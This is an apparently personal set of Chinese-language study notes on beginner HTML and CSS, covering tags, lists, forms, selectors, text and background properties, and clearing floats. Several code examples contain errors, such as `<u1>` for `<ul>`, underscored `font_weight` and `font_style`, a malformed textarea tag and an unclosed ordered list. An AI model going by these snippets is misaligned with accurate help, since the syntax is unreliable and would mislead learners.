<td align="center"><code>&amp;mdash;</code></td>
<td align="center"><code>&amp;#151;</code></td>
<td align="center">长破折号</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="2-4-自闭合标签"><a href="#2-4-自闭合标签" class="headerlink" title="2.4. 自闭合标签"></a>2.4. 自闭合标签</h4><p>-<br>HTML标签分为2种，一种是“一般标签”，另外一种是“自闭合标签”。一般标签有开始符号和结束符号，自闭合标签只有开始符号没有结束符号。</p>
<p>-<br>一般标签可以在开始符号和结束符号之间插入其他标签或文字。</p>
<p>-<br>自闭合标签由于没有结束符号，不能插入其他标签或文字，只能定义自身的属性。</p>
<p>   -<br>一般标签</p>
<p>举例：<code>&lt;body&gt;&lt;/body&gt;</code></p>
<p>   -<br>自闭合标签</p>
<p>举例：<code>&lt;br/&gt;</code>、<code>&lt;hr/&gt;</code></p>
<h4 id="2-5-块元素和行内元素"><a href="#2-5-块元素和行内元素" class="headerlink" title="2.5. 块元素和行内元素"></a>2.5. 块元素和行内元素</h4><p>-<br>HTML元素根据浏览器表现形式分为两类：①块元素；②行内元素；</p>
<p>-<br>  块元素特点：</p>
<ul>
<li>独占一行，排斥其他元素跟其位于同一行，包括块元素和行内元素；</li>
<li>块元素内部可以容纳其他块元素或行元素；</li>
</ul>
<h2 id="常见块元素有：h1-h6、p、hr、div等。"><a href="#常见块元素有：h1-h6、p、hr、div等。" class="headerlink" title="常见块元素有：h1~h6、p、hr、div等。"></a>常见块元素有：h1~h6、p、hr、div等。</h2><p>  行内元素特点：</p>
<ul>
<li>可以与其他行内元素位于同一行；</li>
<li>行内内部可以容纳其他行内元素，但不可以容纳块元素，不然会出现无法预知的效果；</li>
</ul>
<p>常见行内元素有：strong、em、span等。</p>
<h4 id="2-6-图像标签"><a href="#2-6-图像标签" class="headerlink" title="2.6. 图像标签"></a>2.6. 图像标签</h4><p>-<br>语法：<code>&lt;img src=&quot;图像URL&quot;/&gt;</code></p>
<p>-<br>属性：</p>
<p>   -<br>src是标签的必须属性，用于指定图像文件的路径和文件名</p>
<p>   -<br>alt    替换文本，图像不能显示时出现的文字</p>
<p>   -<br>tltle  提示文本，鼠标放在图像上出现的文字</p>
<p>   -<br>width  设置图像的宽度</p>
<p>   -<br>height 设置图像的高度</p>
<p>   -<br>border 设置图像边框粗细</p>
<p>-<br>  注意点：</p>
<ul>
<li><p>图像标签可以有多个属性，必须写在标签名的后面</p>
</li>
<li><p>属性之间不分先后顺序，标签名与属性，属性与属性之间均以空格分开</p>
</li>
<li><p>属性采取键值的格式，即key&#x3D;”value”的格式，属性&#x3D;”属性值”</p>
</li>
<li><p>相对路径：以引用文件所在位置为参考建立出的目录路径（图片相对于HTML页面的位置）</p>
<ul>
<li></li>
</ul>
</li>
</ul>
<p>同一级路径：<code>&lt;img src=&quot;baidu.gif&quot;/&gt;</code></p>
<p>   -<br>下一级路径：<code>&lt;img src=&quot;images/baidu.gif&quot;/&gt;（下一级文件目录+/+图像名）</code></p>
<p>   -<br>上一级路径：<code>&lt;img src=&quot;../baidu.gif&quot;/&gt;</code></p>
<p>   -<br>绝对路径：绝对位置，从盘符直接到目标位置（网页上的图像也可以拿）</p>
<h4 id="2-7-超链接标签"><a href="#2-7-超链接标签" class="headerlink" title="2.7 超链接标签"></a>2.7 超链接标签</h4><p>(1).链接的语法格式：</p>
<p><code>&lt;a href=&quot;跳转目标&quot; target=&quot;目标窗口弹出方式&quot;&gt;文本或图像&lt;/a&gt;</code></p>
<p>target 打开窗口的方式  默认的值时_self 当前窗口打开页面 <em>blank 新窗口打开页面</em></p>
<p>(2).链接分类：</p>
<p>Ⅰ.外部链接：    <code>&lt;a href=&quot;http://www.qq.com&quot; target=&quot;_blank&quot;&gt;腾讯&lt;/a&gt;</code></p>
<pre><code>Ⅱ. 内部链接：网站内部页面之间的相互链接

     `&lt;a href=&quot;gongsijianjie.html&quot; target=&quot;_blank&quot;&gt;公司简介&lt;/a&gt;`

Ⅲ.空链接：`&lt;a href=&quot;#&quot;&gt;公司地址&lt;/a&gt;`

Ⅳ.下载链接：地址链接的是文件.exe或者是zip等压缩包形式
</code></pre>
<p>              <code>&lt;a href=&quot;img.zip&quot;&gt;下载文件&lt;/a&gt;</code></p>
<pre><code>Ⅴ. 网络元素的链接：在网页中的各种网页元素，如文本，图像，表格，音频，视频等都可以添加超链接
</code></pre>
<p>             <code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;&lt;img src=&quot;img.jpg&quot; /&gt;&lt;/a&gt;</code></p>
<pre><code>Ⅵ.锚点链接：点我们点击链接，可以快速定位到页面中的某个位置。
</code></pre>
<p>            在链接文本的href属性中，设置属性值为#名字的形式，</p>
<pre><code>        如`&lt;a href=&quot;#two&quot;&gt;第二集&lt;/a&gt;`
</code></pre>
<p>             找到目标位置标签，里面添加一个id属性&#x3D;刚才的名字，如：</p>
<pre><code>        `&lt;h3 id=&quot;two&quot;&gt;第二集介绍&lt;/h3&gt;`
</code></pre>
<h3 id="3-列表"><a href="#3-列表" class="headerlink" title="3. 列表"></a>3. 列表</h3><table>
<thead>
<tr>
<th align="center">标签</th>
<th align="center">语义</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ol</td>
<td align="center">ordered list</td>
<td align="center">有序列表</td>
</tr>
<tr>
<td align="center">ul</td>
<td align="center">unordered list</td>
<td align="center">无序列表</td>
</tr>
<tr>
<td align="center">dl</td>
<td align="center">definition list</td>
<td align="center">定义列表</td>
</tr>
</tbody></table>
<p>-<br>列表有3种：有序列表、无序列表和定义列表。</p>
<p>-<br>有序列表和无序列表都比较常用，而定义列表比较少用。在实际应用中，最常用的是无序列表，请大家重点掌握。</p>
<h4 id="3-1-有序列表"><a href="#3-1-有序列表" class="headerlink" title="3.1. 有序列表"></a>3.1. 有序列表</h4><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>  <span class="attr">type</span>=<span class="string">&quot;列表项符号&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表项li&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表项li&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表项li&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="有序列表type属性"><a href="#有序列表type属性" class="headerlink" title="有序列表type属性"></a>有序列表type属性</h5><table>
<thead>
<tr>
<th align="left">type属性值</th>
<th align="left">列表项的序号类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">数字1、2、3……</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">小写英文字母a、b、c……</td>
</tr>
<tr>
<td align="left">A</td>
<td align="left">大写英文字母A、B、C……</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">小写罗马数字i、ii、iii……</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">大写罗马数字I、II、III……</td>
</tr>
</tbody></table>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h5><p>学习了CSS之后，有序列表列表项符号由 <code>list-style-type</code> 属性定义，到时候应该摒弃 <code>type</code> 属性</p>
<h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>列表序1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>列表序2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">li</span>&gt;</span>列表序3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> 	 ...</span><br><span class="line"> <span class="tag">&lt;/<span class="name">u1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><p>-<br>无序列表的各个列表项之间没有顺序级别之分，是并列的</p>
<p>-<br>中只能嵌套- </p>
<p>,直接在标签中输入其他标签或者文字的做法是不被允许的</p>
<p>- </p>
<p>- </p>
<h4 id="自定义列表"><a href="#自定义列表" class="headerlink" title="自定义列表"></a>自定义列表</h4><ul>
<li>语法</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dt</span>&gt;</span>名词1<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dd</span>&gt;</span>名词1解释1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dd</span>&gt;</span>名词1解释2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意点</p>
<ul>
<li><code>&lt;dl&gt;&lt;/dl&gt;里面只能包含&lt;dt&gt;和&lt;dd&gt;</code></li>
<li><code>&lt;dt&gt;和&lt;dd&gt;个数没有限制，经常是一个&lt;dt&gt;对应多个&lt;dd&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><ul>
<li>目的：使用表单的目的是为了收集用户信息。</li>
<li>组成：表单域，表单控件（也称为表单元素），提示信息</li>
</ul>
<h4 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h4><ul>
<li>语法：</li>
</ul>
<p>&#96;&lt;form action&#x3D;”ur地址”method&#x3D;”提交方式”name&#x3D;”表单名称”&gt;各种表单元素控件</p>
<h4 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h4><ul>
<li>input 输入表单元素</li>
<li>select下拉表单元素</li>
<li>textarea 文本域元素</li>
</ul>
<h5 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h5><table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td></td>
<td>文本框，用户可以在里面输入任何数字</td>
</tr>
<tr>
<td>password</td>
<td></td>
<td>密码框：用户看不见输入的密码</td>
</tr>
<tr>
<td>radio</td>
<td></td>
<td>单选按钮  可以实现多选一</td>
</tr>
<tr>
<td>checkbox</td>
<td></td>
<td>复选框，可以实现多选</td>
</tr>
<tr>
<td>reset</td>
<td></td>
<td>重置按钮可以还原表单元素初始的默认状态</td>
</tr>
<tr>
<td>button</td>
<td></td>
<td>定义可点击按钮（多数情况下，用于通过JS启动脚本）</td>
</tr>
<tr>
<td>submit</td>
<td></td>
<td>提交按钮，可以把表单域form里面的表单元素 里面的值 提交给后台服务器</td>
</tr>
<tr>
<td>file</td>
<td></td>
<td>定义输入字段和“浏览”按钮，供文件上传</td>
</tr>
<tr>
<td>hidden</td>
<td></td>
<td>定义隐藏的输入字段</td>
</tr>
<tr>
<td>image</td>
<td></td>
<td>定义图像形式的提交按钮</td>
</tr>
<tr>
<td>name</td>
<td>由用户自定义</td>
<td>表单元素的名字，要求单选按钮和复选框要有相同的name值，区别不同的表单</td>
</tr>
<tr>
<td>value</td>
<td>由用户自定义</td>
<td>规定input的值</td>
</tr>
<tr>
<td>checked</td>
<td>checked</td>
<td>属性主要针对于单选按钮和复选框，主要作用一打开页面就要可以默认选择某个表单元素。</td>
</tr>
<tr>
<td>maxlength</td>
<td>正整数</td>
<td>是用户在表单元素输入的最大字符串，一般较少使用</td>
</tr>
</tbody></table>
<h4 id="下拉表单"><a href="#下拉表单" class="headerlink" title="下拉表单"></a>下拉表单</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span> 下拉表单</span><br><span class="line">		  <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项一<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项二<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span>&gt;</span>选项三<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          ...</span><br><span class="line">		  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意点</p>
<ul>
<li><code>&lt;select&gt;中至少包含一对&lt;option&gt;</code></li>
<li>在中定义selected&#x3D;”selected”时，当前项就为默认项</li>
</ul>
</li>
</ul>
<h4 id="文本域元素"><a href="#文本域元素" class="headerlink" title="文本域元素"></a>文本域元素</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea rows=&quot;3&quot;cols=&quot;20&quot;;&gt;</span><br><span class="line">		文本内容</span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line">    </span><br><span class="line">cols rows 决定大小</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h3><p>-<br>css主要由两个主要的部分构成：选择器以及一条或多条声明</p>
<p>-<br>选择器 {属性值 ; 属性值}（选择器用于指定css样式的Html标签，花括号内是对该对象设定的具体样式）</p>
<p>-<br>属性和属性值以“键值对”的形式出现（写在title和head之间）</p>
<h4 id="css-代码风格"><a href="#css-代码风格" class="headerlink" title="css 代码风格"></a>css 代码风格</h4><ul>
<li>样式格式书写：紧凑格式 eg:h3{属性值1;属性值2}</li>
</ul>
<p>展开格式eg:h3{</p>
<p>属性值1;</p>
<p>属性值2；</p>
<p>}（推荐）</p>
<ul>
<li><p>样式大小写：属性值关键字全部用小写字母，特殊情况除外</p>
</li>
<li><p>空格规范：</p>
<ul>
<li>属性值前面，冒号后面，保留一个空格</li>
<li>选择器（标签）和大括号中间保留空格</li>
</ul>
</li>
</ul>
<h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><ul>
<li>作用：选择器就是根据不同需求把不同的标签选出来，即选择标签用的</li>
<li>分类：基础选择器和复合选择器</li>
</ul>
<h4 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h4><ul>
<li>组成：标签选择器，类选择器，id选择器，通配符选择器</li>
</ul>
<h4 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h4><ul>
<li>定义：是指用HTML标签名称作为选择器，按照标签名称的分类，为页面中某一类标签指定统一的CSS样式把某一类标签全部选择出来设置为统一样式</li>
</ul>
<h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><ul>
<li>定义：单独选择一个或者几个标签，利用class属性来调用class 类的意思</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.类名&#123;</span><br><span class="line">              属性1：属性值1;</span><br><span class="line">                ……</span><br><span class="line">              &lt;div class=&quot;red&quot;&gt; 变红色&lt;/div&gt;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>口诀：</p>
<ul>
<li>样式点定义   结构类类调用    一个或多个    开发最常用</li>
</ul>
</li>
</ul>
<h5 id="多类名"><a href="#多类名" class="headerlink" title="多类名"></a>多类名</h5><ul>
<li><p>在标签class属性中写多个类名   ，多个类名中间必须用空格分开</p>
</li>
<li><p>使用：</p>
<ul>
<li>可以把一些标签元素相同的样式（共同的部分）放到一个类里面</li>
<li>这些标签都可以调用这个公共的类，然后在调用自己独有的类</li>
</ul>
</li>
</ul>
<h4 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h4><ul>
<li>样式通过#定义，结构id调用,只能调用一次，别人切勿使用</li>
</ul>
<h5 id="与类区别"><a href="#与类区别" class="headerlink" title="与类区别"></a>与类区别</h5><ul>
<li>类选择器（class）好比人的名字，一个人可以有多个名字，同时一个名字也可以被多个人使用</li>
<li>id选择器好比人的身份证号码，全中国是唯一的，不得重复</li>
<li>id选择器和类选择器最大的不同在于使用次数上</li>
<li>类选择器在修改样式中使用的最多，id选择器一般用于页面唯一性的元素，经常和JS搭配使用</li>
</ul>
<h4 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">	属性1：属性值;</span><br><span class="line">		……</span><br><span class="line">&#125;（通配符选择器不需要调用，自动就给所有的元素使用样式）</span><br></pre></td></tr></table></figure>

<h3 id="css字体属性"><a href="#css字体属性" class="headerlink" title="css字体属性"></a>css字体属性</h3><h4 id="设置字体"><a href="#设置字体" class="headerlink" title="设置字体"></a>设置字体</h4><p>-<br>语法：<code>p &#123; font-family:&quot;Microsoft&quot;;&#125;</code>或者<code>div &#123; font-family:Arial,&quot;Mrcrosoft Yahei&quot;&#125;</code></p>
<p>-<br>  注意点</p>
<ul>
<li>各种字体之间必须使用英文状态下的逗号隔开</li>
<li>一般情况下，如果有空格隔开的多个单词组成的字体，加引号</li>
<li>尽量只用系统默认自带字体，保证任何用户的浏览器中都能使用</li>
</ul>
<h4 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a>字体大小</h4><ul>
<li><p>语法：<code>p&#123;font-size:20px;&#125;</code></p>
</li>
<li><p>注意点</p>
<ul>
<li>标题标签比较特殊，需要单独制定文字大小</li>
<li>给body指定整个页面文字的大小</li>
</ul>
</li>
</ul>
<h4 id="字体粗细"><a href="#字体粗细" class="headerlink" title="字体粗细"></a>字体粗细</h4><ul>
<li>语法：<code>p&#123;font_weight:bold；&#125;//或者直接给数字一样的，在实际开发中通常使用数字</code></li>
</ul>
<h4 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h4><ul>
<li>语法：<code>p&#123;font_style:normal;&#125;</code></li>
</ul>
<h4 id="字体的复合形式"><a href="#字体的复合形式" class="headerlink" title="字体的复合形式"></a>字体的复合形式</h4><ul>
<li><p>语法：<code>body&#123;font: font-style font-weight font-size line-height font-family &#125;</code></p>
</li>
<li><p>注意点：</p>
<ul>
<li>简写模式，不能随意改变顺序，属性之间以空格隔开，文字大小和文字字体不能省略</li>
</ul>
</li>
</ul>
<h3 id="css文本属性"><a href="#css文本属性" class="headerlink" title="css文本属性"></a>css文本属性</h3><p>-<br>对齐文本：text-align 属性用于设置元素内文本内容的水平对齐方式</p>
<p><code>div&#123;text-align:center;&#125;</code></p>
<p>-<br>装饰文本：下划线，删除线，上划线。</p>
<p><code>div&#123;text-decoration:overline/none;&#125;</code></p>
<p>-<br>文本缩进：</p>
<p><code>p&#123;text-indent:20px;&#125; //em 相对单位，当前元素1个文字的大小</code></p>
<p>-<br>行间距：</p>
<p><code>p&#123;line-height:26px;&#125;//有测量小工具，一般从一段的最下面到下一段的最下面</code></p>
<h3 id="CSS的元素显示模式"><a href="#CSS的元素显示模式" class="headerlink" title="CSS的元素显示模式"></a>CSS的元素显示模式</h3><ul>
<li>定义：元素显示迷失模式就是元素（标签）以什么方式显示，比如</li>
</ul>
<h4 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h4><ul>
<li><p><code>&lt;div&gt;, &lt;h1&gt;-&lt;h6&gt;,&lt;p&gt;,&lt;ul&gt;,&lt;ol&gt;,&lt;li&gt;</code></p>
</li>
<li><p>特点</p>
<ul>
<li>比较霸道，自己独占一行</li>
<li>高度，宽度，外边距，以及内边距都可以控制</li>
<li>宽度默认为容器（父级宽度）的100%</li>
<li>是一个容器以及盒子，里面可以放行或者块级元素</li>
</ul>
</li>
<li><p>注意点：</p>
<ul>
<li>文字类的元素不能使用块级元素</li>
<li><code>&lt;p&gt;标签主要存放文字，因此&lt;p&gt;里面不能放块元素，特别是不能放&lt;div&gt; &lt;h1&gt;-&lt;h6&gt; 等都是文字类块级元素，里面也不能放其他块级元素</code></li>
</ul>
</li>
</ul>
<h4 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h4><p>-<br><a href=""> **  ~~ ,  ~~**</a></p>
<p>-<br>  特点：</p>
<ul>
<li><p>相邻行内元素在一行上，一行可以显示多个，</p>
</li>
<li><p>高，宽直接设置是无效的</p>
</li>
<li><p>默认宽度就是它本身内容的宽度</p>
</li>
<li><p>行内元素只能容纳文本或其他行内元素</p>
</li>
<li><p>注意;</p>
<ul>
<li>链接里面不能再放链接</li>
<li><a href="">里面可以放块级元素，但是<a href="">转换一下会计模式最安全</a></a></li>
</ul>
</li>
</ul>
<h4 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h4><ul>
<li><p>同时具有块元素和行内元素的特点 ,,</p>
</li>
<li><p>特点：</p>
<ul>
<li>和相邻行内元素在一行上，直接会有空白缝隙，一行可以显示多个</li>
<li>默认高度就是它本身内容的宽度</li>
<li>高度，行高，外边距以及内边距都可以控制（块级元素特点）</li>
</ul>
</li>
</ul>
<h4 id="元素显示模式转换"><a href="#元素显示模式转换" class="headerlink" title="元素显示模式转换"></a>元素显示模式转换</h4><ul>
<li>一个模式的元素需要另外一种模式的特性</li>
<li>转换为块元素：<code>display：block；</code></li>
<li>转换为行内元素：<code>display:inline;</code></li>
<li>转换为行内块：<code>display：inline-block；</code></li>
</ul>
<h3 id="单行文字垂直居中的代码"><a href="#单行文字垂直居中的代码" class="headerlink" title="单行文字垂直居中的代码"></a>单行文字垂直居中的代码</h3><p>-<br>原理：让文字的行高等于盒子的高度就可以让文字在当前盒子垂直居中)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">line-height: 40px;</span><br><span class="line">height: 40px;</span><br></pre></td></tr></table></figure>



<h3 id="css的背景"><a href="#css的背景" class="headerlink" title="css的背景"></a>css的背景</h3><h4 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h4><ul>
<li>语法：<code>background-image: url();//none就是没有图片</code></li>
<li>背景平铺：background-repeat: no-repeat;</li>
<li>repeat:默认的背景图像平铺；</li>
<li>no-repeat背景图像不平铺</li>
<li>repeat-x:背景图像在横向平铺；</li>
<li>repeat-y:背景图像在纵向平铺</li>
<li>注意：页面元素既可以添加背景图片也可以添加背景颜色，只不过背景图片会压着背景颜色</li>
</ul>
<h4 id="背景图片位置"><a href="#背景图片位置" class="headerlink" title="背景图片位置"></a>背景图片位置</h4><ul>
<li><p>语法：<code>background-position：x,y</code></p>
</li>
<li><p>注意：</p>
<ul>
<li>如果是方位名词 right center 和 center right效果等价跟顺序没有关系</li>
<li>如果只写了一个方位名词，第二个值默认居中对齐。第一个参数是top,y轴顶部对齐，第二个参数省略x 轴是 水平居中显示的.background-position:tap;</li>
<li>如果参数值是精确坐标，那么第一个肯定是x坐标，另一个是y坐标</li>
</ul>
</li>
</ul>
<p>如果只指定一个数值，哪该数值一定是x坐标，另一个默认垂直居中</p>
<ul>
<li>如果指定的两个值是精确单位和方位单位混合使用，则第一个是x坐标，第二个值是y坐标</li>
</ul>
<h4 id="背景图像固定"><a href="#背景图像固定" class="headerlink" title="背景图像固定"></a>背景图像固定</h4><ul>
<li>语法：<code>background-attachment属性设置背景图像是否固定或者随着页面的其余部分滚动</code></li>
</ul>
<p><code>background-attachment:scroll || fixed</code></p>
<h4 id="背景复合写法"><a href="#背景复合写法" class="headerlink" title="背景复合写法"></a>背景复合写法</h4><ul>
<li>一般约定的顺序：背景颜色 ，背景图片地址， 背景平铺， 背景图像滚动， 背景图片位置；</li>
</ul>
<h4 id="背景颜色半透明"><a href="#背景颜色半透明" class="headerlink" title="背景颜色半透明"></a>背景颜色半透明</h4><ul>
<li>语法：<code>background:rgba(0, 0, 0, 0.3);//最后一个透明度 [0,1]</code></li>
<li>注意：习惯把0.3的0省略掉，背景半透明是指盒子北京半透明，盒子里面的内容不受影响</li>
</ul>
<h3 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h3><h4 id="为什么需要浮动"><a href="#为什么需要浮动" class="headerlink" title="为什么需要浮动"></a>为什么需要浮动</h4><ul>
<li>可以让多个块级盒子在一行没有缝隙的排列</li>
</ul>
<hr>
<h4 id="浮动两个注意点"><a href="#浮动两个注意点" class="headerlink" title="浮动两个注意点"></a>浮动两个注意点</h4><ul>
<li>浮动和标准流的父盒子搭配（先用标准流的父元素排列上下位置，之后内部子元素采取浮动排列左右位置）</li>
<li>一个元素浮动了，理论上其余的兄弟元素也要浮动（浮动的盒子只会影响浮动盒子后面的标准流，不会影响前面的标准流）</li>
</ul>
<h4 id="为什么需要清除浮动？"><a href="#为什么需要清除浮动？" class="headerlink" title="为什么需要清除浮动？"></a>为什么需要清除浮动？</h4><ul>
<li>由于浮动元素不再占用原文档流的位置，所以会对后面的元素排版产生影响</li>
<li>（子盒子浮动，脱标，父盒子高度变为0，不会撑开盒子）</li>
</ul>
<h4 id="清除浮动的本质："><a href="#清除浮动的本质：" class="headerlink" title="清除浮动的本质："></a>清除浮动的本质：</h4><ul>
<li>清除浮动的本质是清除浮动元素造成的影响</li>
<li>如果父盒子本身有高度，则不需要清除浮动</li>
<li>清除浮动以后，父级会根据浮动的子盒子自动检测高度。父级有了高度就不会影响下面的标准流</li>
</ul>
<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">选择器 &#123; clear: 属性值；&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">left</td>
<td>不允许左侧有浮动元素（清除左侧浮动的影响）</td>
</tr>
<tr>
<td align="left">right</td>
<td>不允许右侧有浮动元素（清除右侧浮动的影响）</td>
</tr>
<tr>
<td align="left">both</td>
<td>同时清除左右两侧浮动的影响</td>
</tr>
</tbody></table>
<h4 id="清除浮动的方法："><a href="#清除浮动的方法：" class="headerlink" title="清除浮动的方法："></a>清除浮动的方法：</h4><p>- </p>
<h5 id="额外标签法也称隔墙法，是W3C推荐的做法"><a href="#额外标签法也称隔墙法，是W3C推荐的做法" class="headerlink" title="额外标签法也称隔墙法，是W3C推荐的做法"></a>额外标签法也称隔墙法，是W3C推荐的做法</h5><ul>
<li>额外标签法会在浮动的元素末尾添加一个空的标签（ 要求这个新的空标签必须是块级元素，不能是行内元素）</li>
<li>例如：</li>
<li>优点：通俗易懂、书写方便</li>
<li>缺点：添加许多无意义的标签，结构化较差</li>
<li></li>
</ul>
<h5 id="父级添加overflow属性"><a href="#父级添加overflow属性" class="headerlink" title="父级添加overflow属性"></a>父级添加overflow属性</h5><ul>
<li>给父级元素添加overflow属性，将其属性值设置为hidden , auto ,scroll</li>
<li>优点：代码简洁</li>
<li>缺点：无法显示溢出部分</li>
<li></li>
</ul>
<h5 id="父级添加after伪元素（额外标签法的升级版）"><a href="#父级添加after伪元素（额外标签法的升级版）" class="headerlink" title="父级添加after伪元素（额外标签法的升级版）"></a>父级添加after伪元素（额外标签法的升级版）</h5><ul>
<li>优点：没有增加标签，结构更简单</li>
<li>缺点：照顾低版本浏览器</li>
<li></li>
</ul>
<h6 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.clearfix:after&#123;</span><br><span class="line">	content:&quot;&quot;;</span><br><span class="line">	display:block;</span><br><span class="line">	height:0;</span><br><span class="line">	clear:both;</span><br><span class="line">	visibility:hidden;</span><br><span class="line">&#125;</span><br><span class="line">.clearfix&#123;</span><br><span class="line">	/*IE6、7专有*/</span><br><span class="line"> 	*zoom：1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>父级添加双伪元素</li>
</ul>
<h4 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h4><ul>
<li><strong>jpg</strong> : 颜色多 , 做产品类图片</li>
<li><strong>gif</strong> : 有动画效果 , 做动画</li>
<li><strong>png</strong> : 能保持透明背景 , 颜色多</li>
</ul>
<h4 id="PS切图"><a href="#PS切图" class="headerlink" title="PS切图"></a>PS切图</h4><h5 id="图层切图："><a href="#图层切图：" class="headerlink" title="图层切图："></a>图层切图：</h5><ul>
<li>右击图层，快速导出为PNG</li>
<li>选中需要的图层：图层菜单 -&gt; 合并图层（ctrl+e)</li>
<li>右击 -&gt;快速导出为PNG</li>
</ul>
<h5 id="切片图层："><a href="#切片图层：" class="headerlink" title="切片图层："></a>切片图层：</h5><h6 id="1-利用切片选中图片"><a href="#1-利用切片选中图片" class="headerlink" title="1.利用切片选中图片"></a>1.利用切片选中图片</h6><ul>
<li>利用切片工具手动划出</li>
</ul>
<h6 id="2-导出选中的图片"><a href="#2-导出选中的图片" class="headerlink" title="2.导出选中的图片"></a>2.导出选中的图片</h6><ul>
<li>文件菜单 —&gt;导出—&gt;存储为web设备所用格式—&gt;选择我们想要的图片格式—&gt;存储</li>
</ul>
<h5 id="PS插件切图："><a href="#PS插件切图：" class="headerlink" title="PS插件切图："></a>PS插件切图：</h5><ul>
<li>安装Cutterman插件</li>
</ul>
